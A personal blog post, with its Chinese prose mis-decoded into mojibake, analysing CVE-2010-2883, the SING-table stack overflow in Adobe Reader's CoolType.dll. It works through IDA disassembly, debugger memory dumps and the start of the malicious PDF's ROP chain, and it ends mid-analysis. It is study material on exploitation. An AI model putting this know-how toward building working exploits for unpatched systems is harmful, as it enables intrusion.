<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>CVE-2010-2883 | V1NKeçš„å¿ƒæƒ…åƒåœ¾æ¡¶</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="CVE," />
  

  <meta name="description" content="CVE-2010-2883">
<meta name="keywords" content="CVE-2010-2883">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2010-2883">
<meta property="og:url" content="http://yoursite.com/2018/10/06/CVE-2010-2883/index.html">
<meta property="og:site_name" content="V1NKeçš„å¿ƒæƒ…åƒåœ¾æ¡¶">
<meta property="og:description" content="CVE-2010-2883">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/CVE-2010-2883/QQ20181003-231642@2x.png">
<meta property="og:image" content="http://yoursite.com/CVE-2010-2883/QQ20181003-232041@2x.png">
<meta property="og:image" content="http://yoursite.com/CVE-2010-2883/F2DAE82A-04DD-4123-B7D6-F567218E1D20.png">
<meta property="og:image" content="http://yoursite.com/CVE-2010-2883/QQ20181003-234953@2x.png">
<meta property="og:image" content="http://yoursite.com/CVE-2010-2883/QQ20181004-230857@2x.png">
<meta property="og:image" content="http://yoursite.com/CVE-2010-2883/liucheng.png">
<meta property="og:image" content="http://yoursite.com/CVE-2010-2883/QQ20181006-142548@2x.png">
<meta property="og:updated_time" content="2018-10-06T06:43:55.944Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2010-2883">
<meta name="twitter:description" content="CVE-2010-2883">
<meta name="twitter:image" content="http://yoursite.com/CVE-2010-2883/QQ20181003-231642@2x.png">

  

  
    <link rel="icon" href="/haimian.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">ç›’å­</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">ç›’å­</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            åšå®¢
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            æ ‡ç­¾
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            rel="noopener noreferrer"
            target="_self"
            >
            å‹é“¾
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            å…³äº
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">æ–‡ç« ç›®å½•</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#å‰è¨€ï¼š"><span class="toc-text">å‰è¨€ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#æ­£æ–‡ï¼š"><span class="toc-text">æ­£æ–‡ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-ï¼š"><span class="toc-text">ROP ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æµç¨‹åœ¨æ ˆä¸­çš„æ‰§è¡Œæƒ…å†µï¼š"><span class="toc-text">æµç¨‹åœ¨æ ˆä¸­çš„æ‰§è¡Œæƒ…å†µï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ‰§è¡Œåˆ°å †å–·å°„å-ï¼š"><span class="toc-text">æ‰§è¡Œåˆ°å †å–·å°„å ï¼š</span></a></li></ol></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-CVE-2010-2883" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">CVE-2010-2883</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2018.10.06</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>V1NKe</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbspçƒ­åº¦ <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>â„ƒ
        </span>
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>ç ”ç©¶çš„ç¬¬ä¸€ä¸ªcveï¼Œè·Ÿç€æ¼æ´æˆ˜äº‰è¿™ä¹¦æ¥çš„ï¼Œæ„Ÿè§‰ç¬¬ä¸€ä¸ªæ ˆæº¢å‡ºå°±è¿™ä¹ˆéš¾ã€‚ã€‚è€Œä¸”å‘ç°è¿™ä¸ªcveçš„äººè„‘æ´ä¸ºä»€ä¹ˆèƒ½è¿™ä¹ˆå¤§ã€‚ã€‚</p>
<h2 id="æ­£æ–‡ï¼š"><a href="#æ­£æ–‡ï¼š" class="headerlink" title="æ­£æ–‡ï¼š"></a>æ­£æ–‡ï¼š</h2><p>ç¯å¢ƒé…ç½® ï¼š</p>
<ol>
<li>Windows XP SP3</li>
<li>Ollydbgã€PDFStreamDumperã€IDA</li>
<li>è½¯ä»¶ï¼šAdobe Reader 9.3.4</li>
</ol>
<p>æ¼æ´ç‚¹åœ¨SINGè¡¨å¤„ï¼Œä½äºCoolType.dllæ–‡ä»¶å¤„ã€‚</p>
<p>å…ˆå°†æ¶æ„pdfæ–‡ä»¶å¯¼å…¥PDFStreamDumperï¼ŒæŸ¥çœ‹ä¹‹åå¯ä»¥æ‰¾åˆ°SINGè¡¨çš„æ•°æ®ç»“æ„ã€‚</p>
<p><img src="/CVE-2010-2883/QQ20181003-231642@2x.png" alt="QQ20181003-231642@2x"></p>
<p>å®˜æ–¹å®šä¹‰çš„SINGçš„æ•°æ®ç»“æ„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct&#123;</span><br><span class="line">    char   tag[4];</span><br><span class="line">    ULONG  checkSum;</span><br><span class="line">    ULONG  offset;</span><br><span class="line">    ULONG  length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®æˆ‘ä»¬æ‰€æ‰¾åˆ°çš„SINGè¡¨çš„æ•°æ®ï¼Œå¯ä»¥çŸ¥é“åç§»åœ°å€ä¸º0x11cã€‚å†å¾€ä¸‹æ‰¾0x11cåç§»å¤„çš„å†…å®¹ï¼š</p>
<p><img src="/CVE-2010-2883/QQ20181003-232041@2x.png" alt="QQ20181003-232041@2x"></p>
<p>ä½†æ˜¯åœ¨åç§»0x10å¤„çš„å†…å®¹æ‰æ˜¯uniqueNameåŸŸèµ·å§‹å†…å®¹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h           &lt;-----------æ ˆé•¿åº¦0x104</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04                 mov     eax, ___security_cookie    &lt;---------Canary</span><br><span class="line">.text:0803DD09                 xor     eax, ebp</span><br><span class="line">.text:0803DD0B                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11                 push    4Ch</span><br><span class="line">.text:0803DD13                 mov     eax, offset sub_8184A54</span><br><span class="line">.text:0803DD18                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35                 call    sub_804172C</span><br><span class="line">.text:0803DD3A                 xor     esi, esi</span><br><span class="line">.text:0803DD3C                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43                 jz      loc_803DF00</span><br><span class="line">.text:0803DD49                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62                 push    edi             ; int</span><br><span class="line">.text:0803DD63                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A                 call    sub_80217D7</span><br><span class="line">.text:0803DD6F                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72                 jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;  &lt;------SINGè¡¨å…¥æ ˆ</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]   </span><br><span class="line">.text:0803DD7D                 call    sub_8021B06               &lt;------å¤„ç†singè¡¨</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9</span><br><span class="line">.text:0803DD9F                 add     eax, 10h                  &lt;-------uniqueNameåŸŸ</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat                    &lt;-------æº¢å‡ºï¼</span><br></pre></td></tr></table></figure>
<p>å…ˆæ¥çœ‹çœ‹å¤„ç†SINGè¡¨çš„é‚£ä¸€å—å‡½æ•°åœ°æ–¹ã€‚</p>
<p>å…ˆæŠŠå­—ç¬¦ä¸²SINGå…¥æ ˆï¼Œåå…¥æ ˆediï¼Œè°ƒè¯•å¯å¾—ï¼š</p>
<p><img src="/CVE-2010-2883/F2DAE82A-04DD-4123-B7D6-F567218E1D20.png" alt="F2DAE82A-04DD-4123-B7D6-F567218E1D20"></p>
<p>æš‚ä¸”è¿˜ä¸çŸ¥é“ä»–çš„å†…å®¹æ˜¯æ€ä¹ˆå›äº‹ã€‚ç»§ç»­çœ‹ã€‚</p>
<p>åæ¥èµ‹å€¼äº†ecxã€‚è°ƒç”¨å®Œå‡½æ•°ä¹‹åeaxä¸­å‡½æ•°çš„è¿”å›å€¼å°±æ˜¯åŸecxçš„å€¼ï¼Œæ¥å¯¹æ¯”ä¸€ä¸‹å‰åçš„å€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨å‰ecxï¼š</span><br><span class="line">0012E4B4  74 F3 A8 04 28 6A 1C 02 00 00 00 00 00 00 00 00  tèŸ¥(j........</span><br><span class="line">0012E4C4  CC B9 E7 00 70 E4 12 00 0C E7 12 00 54 4A 18 08  å¦?p?..?.TJ</span><br><span class="line">0012E4D4  01 00 00 00 D8 E4 12 00 B0 E6 12 00 00 00 00 00  ...åŠ.ç‰ˆ.....</span><br><span class="line">0012E4E4  E5 64 20 44 58 E8 12 00 9C AE 23 08 EF 52 08 08  éŒ® DX?.æ¹²#é¢®</span><br><span class="line">0012E4F4  50 A6 23 08 BC 2D BB 04 0B 0D 08 08 6C F3 A8 04  P???.lèŸ¥</span><br><span class="line">0012E504  D4 E4 12 00 50 E5 12 00 AF F8 11 01 FF FF FF FF  å‡¿.P?.îˆ­ï£µï£µï£µï£µ</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">è°ƒç”¨åeaxï¼š</span><br><span class="line">0012E4B4  6C 0B A9 04 DF 1D 00 00 00 00 00 00 00 00 00 00  l??..........</span><br><span class="line">0012E4C4  CC B9 E7 00 70 E4 12 00 0C E7 12 00 54 4A 18 08  å¦?p?..?.TJ</span><br><span class="line">0012E4D4  01 00 00 00 D8 E4 12 00 B0 E6 12 00 00 00 00 00  ...åŠ.ç‰ˆ.....</span><br><span class="line">0012E4E4  E5 64 20 44 58 E8 12 00 9C AE 23 08 EF 52 08 08  éŒ® DX?.æ¹²#é¢®</span><br><span class="line">0012E4F4  50 A6 23 08 BC 2D BB 04 0B 0D 08 08 6C F3 A8 04  P???.lèŸ¥</span><br><span class="line">0012E504  D4 E4 12 00 50 E5 12 00 AF F8 11 01 FF FF FF FF  å‡¿.P?.îˆ­ï£µï£µï£µï£µ</span><br></pre></td></tr></table></figure>
<p>å‰å…«ä¸ªå­—èŠ‚å‘ç”Ÿäº†å˜åŒ–ã€‚åœ¨çœ‹åå››å­—èŠ‚0x1DDFã€‚è¿™ä¸å°±æ˜¯å‰é¢æ‰€çœ‹åˆ°çš„æ•°æ®é•¿åº¦å—ï¼Ÿæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¨æµ‹å‡ºè¯¥å‡½æ•°å¤§è‡´ä¸Šå°±æ˜¯å¤„ç†SINGè¡¨å†…å®¹çš„ã€‚å†çœ‹çœ‹å‰å››å­—èŠ‚ï¼Œè°ƒç”¨å®Œå‡½æ•°ä¹‹ååˆé‡æ–°èµ‹å€¼äº†ä¸€éeaxï¼Œåˆšå¥½æ˜¯æŠŠå‰å››å­—èŠ‚èµ‹å€¼ç»™äº†eaxã€‚å†çœ‹çœ‹åé¢å¯¹äºeaxçš„è°ƒç”¨ï¼Œåˆæœ‰ä¸€å¤„åŠ ä¸Šäº†0x10ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹å…¶åœ°å€å¤„çš„å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d 0x4A90B6C :</span><br><span class="line">04A90B6C  00 00 01 00 01 0E 00 01 00 00 00 00 00 00 00 3A  ...........:</span><br><span class="line">04A90B7C  98 66 51 E6 AB 53 8B E7 14 A7 82 4A 0C 0C 0C 0C  æ¦Qå¨…Så¬¬î‡J....</span><br><span class="line">04A90B8C  16 0A 12 37 7A 8C E7 36 3F DC A9 03 A1 E1 CF CB  .7zå²€6?å  â™‚çº¤</span><br><span class="line">04A90B9C  7B 78 91 C5 8B 8C F7 5F 3D C8 2F 90 40 D3 35 1E  &#123;xæ‡ªåª½é±›=?æ€ˆ?</span><br><span class="line">04A90BAC  24 0B 45 5F 64 6D 61 0A 1D 5B 9E 6C 2E F6 6A EB  $E_dma.[ç€•.é°†</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸å°±æ˜¯å‰é¢æ‰€çœ‹åˆ°çš„SINGè¡¨å†…å®¹å—ï¼Œåé¢è°ƒç”¨eaxåŠ ä¸Š0x10çš„åŸå› å°±åœ¨äºåŠ ä¸Š0x10åçš„åœ°å€å¤„å†…å®¹æ‰æ˜¯uniqueNameåŸŸçš„å†…å®¹ã€‚</p>
<p>ç„¶åçœ‹ediçš„ä½œç”¨ï¼Œediå¯„å­˜å™¨æ‰€æŒ‡çš„åœ°å€å†…å®¹è®¾ç½®ä¸€ä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¢«ä»€ä¹ˆè°ƒç”¨å³å¯ï¼Œç»å¤šæ¬¡æŸ¥çœ‹ä¹‹åå°±å¯ä»¥å‘ç°ediåç§»0x30å¤„çš„0x4A8F374è¢«ä¸‹é¢å›¾ä¸­å¤„ä»£ç è°ƒç”¨è¿‡ã€‚</p>
<p><img src="/CVE-2010-2883/QQ20181003-234953@2x.png" alt="QQ20181003-234953@2x"></p>
<p>åœ¨æŸ¥çœ‹ä¸€ä¸‹è¯¥å¤„åœ°å€çš„å¯¹åº”å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">d 0x4A8F374:</span><br><span class="line">04A8F374  00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  .......OS/2</span><br><span class="line">04A8F384  B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  ç¢ºé¬°..é›™...VPCLT</span><br><span class="line">04A8F394  D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  è¤—^?.è‚´...6cmap</span><br><span class="line">04A8F3A4  A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  ã£é” ..çœ‘..Xcvt</span><br><span class="line">04A8F3B4  FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ï£µ?9..?.é»¤pgm</span><br><span class="line">04A8F3C4  E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  ç»±è¡²..&amp;`...åª‘asp</span><br><span class="line">04A8F3D4  00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  ...H....glyf</span><br><span class="line">04A8F3E4  0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA?.&amp;?.å¦¦hdmx</span><br><span class="line">04A8F3F4  34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4?..?..Hhead</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯PDFæ–‡ä»¶ä¸­çš„å­—ä½“å¯¹è±¡ã€‚</p>
<p>æ‰€ä»¥è¯´æˆ‘ä»¬è¿™é‡Œå·²ç»ææ¸…æ¥šäº†ç¬¬ä¸€ä¸ªcallå‡½æ•°çš„ç”¨é€”ï¼š</p>
<p>å‡½æ•°é€šè¿‡ä¼ å…¥è¡¨ç›®å½•é¡¹çš„ TAG åç§°ï¼Œç„¶åè¯»å–è¡¨ç›®å½•é¡¹,å¤„ç†åè¿”å›ä¸¤ä¸ªå…ƒç´ ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºè¡¨ç›®å½•çš„å†…å­˜æ˜ å°„åœ°å€ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºè¡¨ç›®å½•çš„é•¿åº¦ã€‚</p>
<p>ææ¸…äº†ç¬¬ä¸€ä¸ªå‡½æ•°ä¹‹åå†çœ‹çœ‹ä¸‹ä¸€ä¸ªæ¼æ´ç‚¹çš„å‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat</span><br></pre></td></tr></table></figure>
<p>ç”¨Ollydbgè°ƒè¯•çœ‹çœ‹ã€‚</p>
<p><img src="/CVE-2010-2883/QQ20181004-230857@2x.png" alt="QQ20181004-230857@2x"></p>
<p>å…ˆæ˜¯åŠ ä¸Šäº†0x10ï¼Œå³å‰æ–‡æåˆ°çš„uniqueNameåŸŸï¼Œå‹å…¥æ ˆä¸­ï¼Œè€Œåå°†ebpå…¥æ ˆï¼Œå†è°ƒç”¨strcatå‡½æ•°ï¼Œæ‰€ä»¥è¯´å°±æ˜¯å°†uniqueNameåŸŸæ‹¼æ¥åˆ°ebpæŒ‡å‘çš„åœ°å€ã€‚</p>
<p>å› ä¸ºå¹¶æ²¡æœ‰é™åˆ¶æ‹¼æ¥çš„é•¿åº¦ï¼Œæ‰€ä»¥å°±äº§ç”Ÿäº†æº¢å‡ºã€‚</p>
<h3 id="ROP-ï¼š"><a href="#ROP-ï¼š" class="headerlink" title="ROP ï¼š"></a>ROP ï¼š</h3><p>æ¥ä¸‹æ¥è·Ÿè¸ªæŸ¥çœ‹ä¸€ä¸‹ä½œè€…æ‰€æ„é€ çš„ROPé“¾ï¼Œæ˜¯å¦‚ä½•æ¥åˆ©ç”¨è¿™ä¸ªæº¢å‡ºæ¼æ´çš„ã€‚è·Ÿè¸ªåå¤è°ƒè¯•è¿‡ä¹‹åå¯ä»¥å¾—å‡ºï¼Œå…ˆæ‰§è¡Œåˆ°æ­¤å¤„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DDD2                 pop     ecx</span><br><span class="line">.text:0803DDD3</span><br><span class="line">.text:0803DDD3 loc_803DDD3:                            ; CODE XREF: sub_803DCF9+D1j</span><br><span class="line">.text:0803DDD3                 cmp     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DDD7                 jnz     loc_803DEA9             &lt;----------è·³è½¬å®ç°</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">.text:0803DEA9 loc_803DEA9:                            ; CODE XREF: sub_803DCF9+5Ej</span><br><span class="line">.text:0803DEA9                                         ; sub_803DCF9+DEj ...</span><br><span class="line">.text:0803DEA9                 lea     eax, [ebp+108h+var_124]</span><br><span class="line">.text:0803DEAC                 push    eax</span><br><span class="line">.text:0803DEAD                 push    ebx</span><br><span class="line">.text:0803DEAE                 push    edi</span><br><span class="line">.text:0803DEAF                 call    sub_8016BDE</span><br></pre></td></tr></table></figure>
<p>è¿›å…¥sub_8016BDEå‡½æ•°ä¸­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:08016BDE                 push    ebp</span><br><span class="line">.text:08016BDF                 sub     esp, 660h</span><br><span class="line">.text:08016BE5                 lea     ebp, [esp-4]</span><br><span class="line">.text:08016BE9                 mov     eax, ___security_cookie</span><br><span class="line">.text:08016BEE                 xor     eax, ebp</span><br><span class="line">.text:08016BF0                 mov     [ebp+664h+var_4], eax</span><br><span class="line">.text:08016BF6                 push    50h</span><br><span class="line">.text:08016BF8                 mov     eax, offset sub_8175D32</span><br><span class="line">.text:08016BFD                 call    __EH_prolog3_catch</span><br><span class="line">.text:08016C02                 mov     eax, [ebp+664h+arg_8]</span><br><span class="line">.text:08016C08                 mov     esi, [ebp+664h+arg_4]</span><br><span class="line">.text:08016C0E                 mov     edi, [ebp+664h+arg_0]</span><br><span class="line">.text:08016C14                 mov     [ebp+664h+var_6BC], eax</span><br><span class="line">.text:08016C17                 mov     eax, offset CriticalSection</span><br><span class="line">.text:08016C1C                 push    eax             ; lpCriticalSection</span><br><span class="line">.text:08016C1D                 mov     [ebp+664h+var_680], esi</span><br><span class="line">.text:08016C20                 mov     [ebp+664h+var_6C0], eax</span><br><span class="line">.text:08016C23                 call    ds:EnterCriticalSection</span><br><span class="line">.text:08016C29                 xor     ebx, ebx</span><br><span class="line">.text:08016C2B                 push    edi</span><br><span class="line">.text:08016C2C                 mov     [ebp+664h+var_668], ebx</span><br><span class="line">.text:08016C2F                 mov     [ebp+664h+var_694], ebx</span><br><span class="line">.text:08016C32                 mov     [ebp+664h+var_678], ebx</span><br><span class="line">.text:08016C35                 call    sub_801BB1C</span><br><span class="line">.text:08016C3A                 cmp     eax, ebx</span><br><span class="line">.text:08016C3C                 pop     ecx</span><br><span class="line">.text:08016C3D                 mov     [ebp+664h+var_67C], eax</span><br><span class="line">.text:08016C40                 jz      loc_80172CE</span><br><span class="line">.text:08016C46                 push    1</span><br><span class="line">.text:08016C48                 push    ebx</span><br><span class="line">.text:08016C49                 push    ebx</span><br><span class="line">.text:08016C4A                 lea     eax, [ebp+664h+var_678]</span><br><span class="line">.text:08016C4D                 push    eax</span><br><span class="line">.text:08016C4E                 lea     eax, [ebp+664h+var_694]</span><br><span class="line">.text:08016C51                 push    eax</span><br><span class="line">.text:08016C52                 push    edi</span><br><span class="line">.text:08016C53                 push    [ebp+664h+var_67C]</span><br><span class="line">.text:08016C56                 call    sub_801BB21</span><br></pre></td></tr></table></figure>
<p>è€Œåè¿›å…¥åˆ°sub_801BB21å‡½æ•°å½“ä¸­ï¼š</p>
